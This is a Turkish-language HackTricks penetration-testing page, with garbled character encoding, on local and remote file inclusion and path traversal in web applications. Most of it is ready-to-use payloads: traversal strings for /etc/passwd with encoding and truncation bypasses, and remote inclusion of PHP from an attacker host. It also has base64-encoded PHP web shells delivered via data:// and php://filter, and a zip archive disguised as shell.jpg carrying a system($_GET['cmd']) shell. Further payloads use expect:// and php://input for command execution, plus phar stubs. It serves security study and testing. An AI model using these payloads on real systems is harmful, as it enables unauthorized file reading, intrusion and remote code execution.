# Dosya Dahil Etme/Yol Traversali

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve bug bounty avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ± ve zorluklarÄ±na dalan iÃ§eriklerle etkileÅŸimde bulunun

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
GerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle hÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nda gÃ¼ncel kalÄ±n

**Son Duyurular**\
Yeni baÅŸlayan bug bounty'ler ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi sahibi olun

BugÃ¼n [**Discord**](https://discord.com/invite/N3FrSbmwdy) Ã¼zerinden bize katÄ±lÄ±n ve en iyi hackerlarla iÅŸbirliÄŸi yapmaya baÅŸlayÄ±n!

## Dosya Dahil Etme

**Uzaktan Dosya Dahil Etme (RFI):** Dosya uzaktan bir sunucudan yÃ¼klenir (En Ä°yi: Kodu yazabilirsiniz ve sunucu bunu Ã§alÄ±ÅŸtÄ±rÄ±r). PHP'de bu varsayÄ±lan olarak **devre dÄ±ÅŸÄ±**dÄ±r (**allow\_url\_include**).\
**Yerel Dosya Dahil Etme (LFI):** Sunucu yerel bir dosyayÄ± yÃ¼kler.

Zafiyet, kullanÄ±cÄ±nÄ±n sunucu tarafÄ±ndan yÃ¼klenecek dosyayÄ± bir ÅŸekilde kontrol edebilmesi durumunda ortaya Ã§Ä±kar.

ZayÄ±f **PHP fonksiyonlarÄ±**: require, require\_once, include, include\_once

Bu zafiyeti istismar etmek iÃ§in ilginÃ§ bir araÃ§: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Ä°lginÃ§ - LFI2RCE dosyalarÄ±
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**BirÃ§ok \*nix LFI listesini birleÅŸtirip daha fazla yol ekleyerek bunu oluÅŸturdum:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

AyrÄ±ca `/`'yi `\` ile deÄŸiÅŸtirmeyi deneyin.\
AyrÄ±ca `../../../../../` eklemeyi deneyin.

AÃ§Ä±klÄ±ÄŸÄ±n var olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in /etc/password dosyasÄ±nÄ± bulmak iÃ§in Ã§eÅŸitli teknikler kullanan bir liste [burada](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt) bulunabilir.

### **Windows**

FarklÄ± kelime listelerinin birleÅŸtirilmesi:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

AyrÄ±ca `/`'yi `\` ile deÄŸiÅŸtirmeyi deneyin.\
AyrÄ±ca `C:/`'yi kaldÄ±rmayÄ± ve `../../../../../` eklemeyi deneyin.

AÃ§Ä±klÄ±ÄŸÄ±n var olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in /boot.ini dosyasÄ±nÄ± bulmak iÃ§in Ã§eÅŸitli teknikler kullanan bir liste [burada](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt) bulunabilir.

### **OS X**

Linux'un LFI listesini kontrol edin.

## Temel LFI ve atlatmalar

TÃ¼m Ã¶rnekler Yerel Dosya Dahil Etme iÃ§in geÃ§erlidir ancak Uzaktan Dosya Dahil Etme iÃ§in de uygulanabilir (sayfa=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences stripped non-recursively
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Verilen dizeye daha fazla karakter ekleme iÅŸlemini atlatÄ±n (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Bu, **PHP 5.4'ten beri Ã§Ã¶zÃ¼ldÃ¼**

### **Kodlama**

Ã‡ift URL kodlamasÄ± (ve diÄŸerleri) gibi standart dÄ±ÅŸÄ± kodlamalar kullanabilirsiniz:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Mevcut klasÃ¶rden

Belki de arka uÃ§ klasÃ¶r yolunu kontrol ediyor:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Sunucu Ãœzerinde Dosya Sistemi Dizinlerini KeÅŸfetme

Bir sunucunun dosya sistemi, belirli teknikler kullanÄ±larak yalnÄ±zca dosyalarÄ± deÄŸil, dizinleri de tanÄ±mlamak iÃ§in Ã¶zyinelemeli olarak keÅŸfedilebilir. Bu sÃ¼reÃ§, dizin derinliÄŸini belirlemeyi ve belirli klasÃ¶rlerin varlÄ±ÄŸÄ±nÄ± sorgulamayÄ± iÃ§erir. Bunu baÅŸarmak iÃ§in aÅŸaÄŸÄ±da ayrÄ±ntÄ±lÄ± bir yÃ¶ntem bulunmaktadÄ±r:

1. **Dizin DerinliÄŸini Belirleme:** Mevcut dizininizin derinliÄŸini, `/etc/passwd` dosyasÄ±nÄ± baÅŸarÄ±yla alarak belirleyin (sunucu Linux tabanlÄ±ysa geÃ§erlidir). Ã–rnek bir URL, Ã¼Ã§ derinliÄŸi gÃ¶steren aÅŸaÄŸÄ±daki gibi yapÄ±landÄ±rÄ±labilir:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **KlasÃ¶rleri Sorgula:** ÅÃ¼pheli klasÃ¶rÃ¼n adÄ±nÄ± (Ã¶rneÄŸin, `private`) URL'ye ekleyin, ardÄ±ndan `/etc/passwd`'a geri gidin. Ek dizin seviyesi derinliÄŸi bir artÄ±rmayÄ± gerektirir:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **SonuÃ§larÄ± YorumlayÄ±n:** Sunucunun yanÄ±tÄ±, klasÃ¶rÃ¼n var olup olmadÄ±ÄŸÄ±nÄ± gÃ¶sterir:
* **Hata / Ã‡Ä±ktÄ± Yok:** `private` klasÃ¶rÃ¼ muhtemelen belirtilen konumda mevcut deÄŸildir.
* **`/etc/passwd` Ä°Ã§eriÄŸi:** `private` klasÃ¶rÃ¼nÃ¼n varlÄ±ÄŸÄ± doÄŸrulanmÄ±ÅŸtÄ±r.
4. **KapsamlÄ± KeÅŸif:** Bulunan klasÃ¶rler, aynÄ± teknik veya geleneksel Yerel Dosya Dahil Etme (LFI) yÃ¶ntemleri kullanÄ±larak alt dizinler veya dosyalar iÃ§in daha fazla araÅŸtÄ±rÄ±labilir.

Dosya sistemindeki farklÄ± konumlarda dizinleri keÅŸfetmek iÃ§in yÃ¼kÃ¼ buna gÃ¶re ayarlayÄ±n. Ã–rneÄŸin, `/var/www/` iÃ§inde bir `private` dizini olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in (mevcut dizinin derinliÄŸi 3 olarak varsayÄ±ldÄ±ÄŸÄ±nda) ÅŸunu kullanÄ±n:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation, web uygulamalarÄ±nda dosya yollarÄ±nÄ± manipÃ¼le etmek iÃ§in kullanÄ±lan bir yÃ¶ntemdir. Genellikle, dosya yollarÄ±nÄ±n sonuna ek karakterler ekleyen belirli gÃ¼venlik Ã¶nlemlerini atlayarak kÄ±sÄ±tlÄ± dosyalara eriÅŸmek iÃ§in kullanÄ±lÄ±r. AmaÃ§, gÃ¼venlik Ã¶nlemi tarafÄ±ndan deÄŸiÅŸtirildiÄŸinde bile istenen dosyaya iÅŸaret eden bir dosya yolu oluÅŸturmaktÄ±r.

PHP'de, dosya sisteminin doÄŸasÄ± gereÄŸi bir dosya yolunun Ã§eÅŸitli temsilleri eÅŸdeÄŸer olarak kabul edilebilir. Ã–rneÄŸin:

* `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` ve `/etc/passwd/` hepsi aynÄ± yol olarak deÄŸerlendirilir.
* Son 6 karakter `passwd` olduÄŸunda, bir `/` eklemek (bunu `passwd/` yaparak) hedeflenen dosyayÄ± deÄŸiÅŸtirmez.
* Benzer ÅŸekilde, bir dosya yoluna `.php` eklenirse (Ã¶rneÄŸin `shellcode.php`), sonuna `/.` eklemek eriÅŸilen dosyayÄ± deÄŸiÅŸtirmeyecektir.

Verilen Ã¶rnekler, hassas iÃ§eriÄŸi (kullanÄ±cÄ± hesap bilgileri) nedeniyle yaygÄ±n bir hedef olan `/etc/passwd`'a eriÅŸmek iÃ§in yol kÄ±saltma nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± gÃ¶stermektedir:
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Bu senaryolarda, gereken geÃ§iÅŸ sayÄ±sÄ± yaklaÅŸÄ±k 2027 civarÄ±nda olabilir, ancak bu sayÄ± sunucunun yapÄ±landÄ±rmasÄ±na baÄŸlÄ± olarak deÄŸiÅŸebilir.

* **Nokta Segmentleri ve Ekstra Karakterler Kullanma**: GeÃ§iÅŸ dizileri (`../`) ek nokta segmentleri ve karakterlerle birleÅŸtirilerek dosya sisteminde gezinmek iÃ§in kullanÄ±labilir, bu sayede sunucu tarafÄ±ndan eklenen dizgiler etkili bir ÅŸekilde gÃ¶z ardÄ± edilir.
* **Gerekli GeÃ§iÅŸ SayÄ±sÄ±nÄ± Belirleme**: Deneme yanÄ±lma yoluyla, kÃ¶k dizine ve ardÄ±ndan `/etc/passwd`'a gitmek iÃ§in gereken `../` dizilerinin tam sayÄ±sÄ±nÄ± bulmak mÃ¼mkÃ¼ndÃ¼r, bÃ¶ylece eklenen dizgiler (Ã¶rneÄŸin `.php`) etkisiz hale getirilirken istenen yol (`/etc/passwd`) saÄŸlam kalÄ±r.
* **Sahte Bir Dizinle BaÅŸlama**: Yolu mevcut olmayan bir dizinle (Ã¶rneÄŸin `a/`) baÅŸlatmak yaygÄ±n bir uygulamadÄ±r. Bu teknik, bir Ã¶nlem olarak veya sunucunun yol ayrÄ±ÅŸtÄ±rma mantÄ±ÄŸÄ±nÄ±n gereksinimlerini karÅŸÄ±lamak iÃ§in kullanÄ±lÄ±r.

Yol kÄ±saltma teknikleri kullanÄ±rken, sunucunun yol ayrÄ±ÅŸtÄ±rma davranÄ±ÅŸÄ±nÄ± ve dosya sistemi yapÄ±sÄ±nÄ± anlamak Ã§ok Ã¶nemlidir. Her senaryo farklÄ± bir yaklaÅŸÄ±m gerektirebilir ve en etkili yÃ¶ntemi bulmak iÃ§in test yapmak genellikle gereklidir.

**Bu zafiyet PHP 5.3'te dÃ¼zeltildi.**

### **Filtre atlatma hileleri**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

PHP'de bu varsayÄ±lan olarak devre dÄ±ÅŸÄ±dÄ±r Ã§Ã¼nkÃ¼ **`allow_url_include`** **KapalÄ±dÄ±r.** Bunun Ã§alÄ±ÅŸmasÄ± iÃ§in **AÃ§Ä±k** olmasÄ± gerekir ve bu durumda sunucunuzdan bir PHP dosyasÄ± dahil edebilir ve RCE elde edebilirsiniz:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
EÄŸer bir sebepten dolayÄ± **`allow_url_include`** **AÃ§Ä±k** ise, ancak PHP dÄ±ÅŸ web sayfalarÄ±na eriÅŸimi **filtreliyorsa**, [bu gÃ¶nderiye](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/) gÃ¶re, Ã¶rneÄŸin base64 ile b64 PHP kodunu Ã§Ã¶zmek ve RCE elde etmek iÃ§in veri protokolÃ¼nÃ¼ kullanabilirsiniz:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
Ã–nceki kodda, son `+.txt` eklendi Ã§Ã¼nkÃ¼ saldÄ±rganÄ±n `.txt` ile biten bir dizeye ihtiyacÄ± vardÄ±, bu yÃ¼zden dize bununla bitiyor ve b64 decode'dan sonra o kÄ±sÄ±m sadece gereksiz veriler dÃ¶necek ve gerÃ§ek PHP kodu dahil edilecek (ve dolayÄ±sÄ±yla, Ã§alÄ±ÅŸtÄ±rÄ±lacak).
{% endhint %}

BaÅŸka bir Ã¶rnek **`php://` protokolÃ¼nÃ¼ kullanmayan**:

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Python KÃ¶k ElemanÄ±

Python'da bu gibi bir kodda:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
EÄŸer kullanÄ±cÄ± **`file_name`** iÃ§in **mutlak bir yol** geÃ§irirse, **Ã¶nceki yol sadece kaldÄ±rÄ±lÄ±r**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Bu, [belgelere](https://docs.python.org/3.10/library/os.path.html#os.path.join) gÃ¶re beklenen davranÄ±ÅŸtÄ±r:

> EÄŸer bir bileÅŸen mutlak bir yol ise, tÃ¼m Ã¶nceki bileÅŸenler atÄ±lÄ±r ve birleÅŸtirme mutlak yol bileÅŸeninden devam eder.

## Java Dizinlerini Listele

Java'da bir Path Traversal varsa ve bir **dosya yerine bir dizin isterseniz**, **dizinin bir listesi dÃ¶ndÃ¼rÃ¼lÃ¼r**. Bu diÄŸer dillerde (bildiÄŸim kadarÄ±yla) olmayacaktÄ±r.

## En Ä°yi 25 parametre

Yerel dosya dahil etme (LFI) zafiyetlerine karÅŸÄ± savunmasÄ±z olabilecek en iyi 25 parametrenin listesi ( [baÄŸlantÄ±dan](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI using PHP wrappers & protocols

### php://filter

PHP filtreleri, veriler okunmadan veya yazÄ±lmadan Ã¶nce **veriler Ã¼zerinde temel deÄŸiÅŸiklik iÅŸlemleri** gerÃ§ekleÅŸtirmeye olanak tanÄ±r. 5 filtre kategorisi vardÄ±r:

* [String Filters](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Verilerden etiketleri kaldÄ±rÄ±r ("<" ve ">" karakterleri arasÄ±ndaki her ÅŸey)
* Bu filtrenin modern PHP sÃ¼rÃ¼mlerinden kaybolduÄŸunu unutmayÄ±n
* [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : FarklÄ± bir kodlamaya dÃ¶nÃ¼ÅŸtÃ¼rÃ¼r (`convert.iconv.<input_enc>.<output_enc>`). **Desteklenen tÃ¼m kodlamalarÄ±n listesini** almak iÃ§in konsolda ÅŸunu Ã§alÄ±ÅŸtÄ±rÄ±n: `iconv -l`

{% hint style="warning" %}
`convert.iconv.*` dÃ¶nÃ¼ÅŸÃ¼m filtresini kÃ¶tÃ¼ye kullanarak **rastgele metin** oluÅŸturabilirsiniz, bu da rastgele metin yazmak veya bir iÅŸlev gibi dahil etme iÅŸlemini rastgele metin yapmak iÃ§in yararlÄ± olabilir. Daha fazla bilgi iÃ§in [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md) sayfasÄ±na bakÄ±n.
{% endhint %}

* [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: Ä°Ã§eriÄŸi sÄ±kÄ±ÅŸtÄ±rÄ±r (Ã§ok fazla bilgi sÄ±zdÄ±rÄ±rken yararlÄ±dÄ±r)
* `zlib.inflate`: Verileri aÃ§ar
* [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : KullanÄ±mdan kaldÄ±rÄ±ldÄ±
* `mdecrypt.*` : KullanÄ±mdan kaldÄ±rÄ±ldÄ±
* DiÄŸer Filtreler
* php'de `var_dump(stream_get_filters());` Ã§alÄ±ÅŸtÄ±rarak birkaÃ§ **beklenmedik filtre** bulabilirsiniz:
* `consumed`
* `dechunk`: HTTP parÃ§alÄ± kodlamasÄ±nÄ± tersine Ã§evirir
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,Â£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
"php://filter" kÄ±smÄ± bÃ¼yÃ¼k/kÃ¼Ã§Ã¼k harf duyarsÄ±zdÄ±r
{% endhint %}

### Rastgele dosyalarÄ± okumak iÃ§in php filtrelerini oracle olarak kullanma

[**Bu yazÄ±da**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) sunulan bir teknik, sunucudan geri dÃ¶nen Ã§Ä±ktÄ±yÄ± almadan yerel bir dosyayÄ± okumayÄ± Ã¶neriyor. Bu teknik, **php filtrelerini oracle olarak kullanarak dosyanÄ±n boolean sÄ±zdÄ±rÄ±lmasÄ± (karakter karakter)** esasÄ±na dayanmaktadÄ±r. Bunun nedeni, php filtrelerinin bir metni yeterince bÃ¼yÃ¼tmek iÃ§in kullanÄ±labilmesidir, bÃ¶ylece php bir istisna fÄ±rlatÄ±r.

Orijinal yazÄ±da tekniÄŸin detaylÄ± bir aÃ§Ä±klamasÄ±nÄ± bulabilirsiniz, ancak burada hÄ±zlÄ± bir Ã¶zet:

* Metnin baÅŸÄ±ndaki karakteri bÄ±rakmak ve dize boyutunu Ã¼ssel olarak artÄ±rmak iÃ§in **`UCS-4LE`** codec'ini kullanÄ±n.
* Bu, **ilk harf doÄŸru tahmin edildiÄŸinde o kadar bÃ¼yÃ¼k bir metin oluÅŸturmak iÃ§in** kullanÄ±lacak ki php bir **hata** tetikleyecek.
* **Dechunk** filtresi, **ilk karakter bir onaltÄ±lÄ±k deÄŸilse her ÅŸeyi kaldÄ±racaktÄ±r**, bÃ¶ylece ilk karakterin onaltÄ±lÄ±k olup olmadÄ±ÄŸÄ±nÄ± bilebiliriz.
* Bu, Ã¶nceki ile birleÅŸtirildiÄŸinde (ve tahmin edilen harfe baÄŸlÄ± diÄŸer filtrelerle), metnin baÅŸÄ±ndaki bir harfi tahmin etmemizi saÄŸlayacak, Ã§Ã¼nkÃ¼ yeterince dÃ¶nÃ¼ÅŸÃ¼m yaptÄ±ÄŸÄ±mÄ±zda artÄ±k onaltÄ±lÄ±k bir karakter olmaktan Ã§Ä±kacaktÄ±r. Ã‡Ã¼nkÃ¼ eÄŸer onaltÄ±lÄ±k ise, dechunk onu silmeyecek ve baÅŸlangÄ±Ã§ bombasÄ± php hatasÄ±nÄ± tetikleyecek.
* **convert.iconv.UNICODE.CP930** codec'i her harfi bir sonrakine dÃ¶nÃ¼ÅŸtÃ¼rÃ¼r (bu codec'ten sonra: a -> b). Bu, ilk harfin `a` olup olmadÄ±ÄŸÄ±nÄ± keÅŸfetmemizi saÄŸlar, Ã§Ã¼nkÃ¼ bu codec'i 6 kez uygularsak a->b->c->d->e->f->g harfi artÄ±k onaltÄ±lÄ±k bir karakter deÄŸildir, bu nedenle dechunk onu silmez ve php hatasÄ± baÅŸlangÄ±Ã§ bombasÄ± ile tetiklenir.
* BaÅŸlangÄ±Ã§ta **rot13** gibi diÄŸer dÃ¶nÃ¼ÅŸÃ¼mler kullanarak n, o, p, q, r gibi diÄŸer karakterleri sÄ±zdÄ±rmak mÃ¼mkÃ¼ndÃ¼r (ve diÄŸer codec'ler, diÄŸer harfleri onaltÄ±lÄ±k aralÄ±ÄŸÄ±na taÅŸÄ±mak iÃ§in kullanÄ±labilir).
* Ä°lk karakter bir sayÄ± olduÄŸunda, bunu base64 kodlamasÄ± yapmak ve sayÄ±yÄ± sÄ±zdÄ±rmak iÃ§in ilk 2 harfi sÄ±zdÄ±rmak gerekir.
* Son sorun, **ilk harften daha fazlasÄ±nÄ± nasÄ±l sÄ±zdÄ±racaÄŸÄ±nÄ±zÄ±** gÃ¶rmektir. **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** gibi sÄ±ralÄ± bellek filtreleri kullanarak karakterlerin sÄ±rasÄ±nÄ± deÄŸiÅŸtirmek ve metnin ilk pozisyonuna diÄŸer harfleri almak mÃ¼mkÃ¼ndÃ¼r.
* Ve **daha fazla veri** elde edebilmek iÃ§in fikir, **baÅŸlangÄ±Ã§ta 2 bayt Ã§Ã¶p verisi oluÅŸturmak** ve **convert.iconv.UTF16.UTF16** ile uygulamak, ardÄ±ndan **UCS-4LE** ile bunu **sonraki 2 baytla pivotlamak** ve **Ã§Ã¶p veriye kadar veriyi silmek** (bu, baÅŸlangÄ±Ã§ metninin ilk 2 baytÄ±nÄ± kaldÄ±racaktÄ±r). Ä°stenilen sÄ±zÄ±ntÄ±ya ulaÅŸana kadar bunu yapmaya devam edin.

YazÄ±da bunu otomatik olarak gerÃ§ekleÅŸtirmek iÃ§in bir araÃ§ da sÄ±zdÄ±rÄ±ldÄ±: [php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit).

### php://fd

Bu sarmalayÄ±cÄ±, iÅŸlemin aÃ§Ä±k olan dosya tanÄ±mlayÄ±cÄ±larÄ±na eriÅŸim saÄŸlar. AÃ§Ä±k dosyalarÄ±n iÃ§eriÄŸini sÄ±zdÄ±rmak iÃ§in potansiyel olarak yararlÄ±dÄ±r:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
**php://stdin, php://stdout ve php://stderr** kullanarak sÄ±rasÄ±yla **dosya tanÄ±mlayÄ±cÄ±larÄ± 0, 1 ve 2**'ye eriÅŸebilirsiniz (bir saldÄ±rÄ±da bunun nasÄ±l faydalÄ± olabileceÄŸinden emin deÄŸilim)

### zip:// ve rar://

Ä°Ã§inde bir PHPShell bulunan bir Zip veya Rar dosyasÄ± yÃ¼kleyin ve eriÅŸin.\
Rar protokolÃ¼nÃ¼ kÃ¶tÃ¼ye kullanabilmek iÃ§in **Ã¶zellikle etkinleÅŸtirilmesi gerekir**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Not edin ki bu protokol php yapÄ±landÄ±rmalarÄ± **`allow_url_open`** ve **`allow_url_include`** ile kÄ±sÄ±tlanmÄ±ÅŸtÄ±r.

### expect://

Expect etkinleÅŸtirilmelidir. Bunu kullanarak kod Ã§alÄ±ÅŸtÄ±rabilirsiniz:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POST parametrelerinde yÃ¼kÃ¼nÃ¼zÃ¼ belirtin:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Bir `.phar` dosyasÄ±, bir web uygulamasÄ± dosya yÃ¼kleme iÃ§in `include` gibi fonksiyonlar kullandÄ±ÄŸÄ±nda PHP kodu Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanÄ±labilir. AÅŸaÄŸÄ±da verilen PHP kodu parÃ§asÄ±, bir `.phar` dosyasÄ±nÄ±n oluÅŸturulmasÄ±nÄ± gÃ¶stermektedir:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` dosyasÄ±nÄ± derlemek iÃ§in aÅŸaÄŸÄ±daki komut Ã§alÄ±ÅŸtÄ±rÄ±lmalÄ±dÄ±r:
```bash
php --define phar.readonly=0 create_path.php
```
Upon execution, a file named `test.phar` will be created, which could potentially be leveraged to exploit Local File Inclusion (LFI) vulnerabilities.

LFI yalnÄ±zca dosya okuma iÅŸlemi yapÄ±yorsa ve iÃ§indeki PHP kodunu Ã§alÄ±ÅŸtÄ±rmÄ±yorsa, `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, veya `filesize()` gibi fonksiyonlar aracÄ±lÄ±ÄŸÄ±yla bir deserialization aÃ§Ä±ÄŸÄ± istismar edilmeye Ã§alÄ±ÅŸÄ±labilir. Bu aÃ§Ä±k, `phar` protokolÃ¼ kullanÄ±larak dosyalarÄ±n okunmasÄ±yla iliÅŸkilidir.

`.phar` dosyalarÄ± baÄŸlamÄ±nda deserialization aÃ§Ä±klarÄ±nÄ±n istismarÄ±nÄ± anlamak iÃ§in aÅŸaÄŸÄ±daki belgede yer alan bilgilere baÅŸvurun:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)

